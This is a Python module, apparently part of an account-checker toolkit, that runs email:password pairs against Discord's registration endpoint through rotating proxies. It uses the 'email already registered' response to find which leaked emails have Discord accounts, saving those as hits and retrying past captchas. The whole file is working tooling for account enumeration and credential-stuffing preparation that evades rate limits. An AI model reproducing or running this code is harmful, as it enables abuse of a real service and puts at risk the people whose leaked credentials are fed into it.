from __main__ import checker
from random import choice, random
from requests import post
from modules.functions import bad_proxy, log,save,set_proxy
from string import ascii_letters as l, digits as d
from random import choices

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        payload = {"fingerprint":"793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM","email":email,"username":"".join(choices(l+d,k=6)),"password":"rth21e98!fmPP","invite":None,"consent":True,"date_of_birth":"1993-05-03","gift_code_sku_id":None,"captcha_key":None}
        try:
            a = post("https://discord.com/api/v8/auth/register",json=payload,proxies=set_proxy(proxy),timeout=checker.timeout).text
            if "EMAIL_TYPE_INVALID_EMA" in a or "token" in a or "captcha-required" in a:
                retries += 1
            elif "EMAIL_ALREADY_REGISTERED" in a:
                if not checker.cui:
                    log("good",email+":"+password,"DiscordVM")
                save("DiscordVM","good",checker.time,email+":"+password)
                checker.good += 1
                checker.cpm += 1
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            checker.errors += 1
    if not checker.cui:
        log("bad",email+":"+password,"DiscordVM")
    checker.bad += 1
    checker.cpm += 1
    return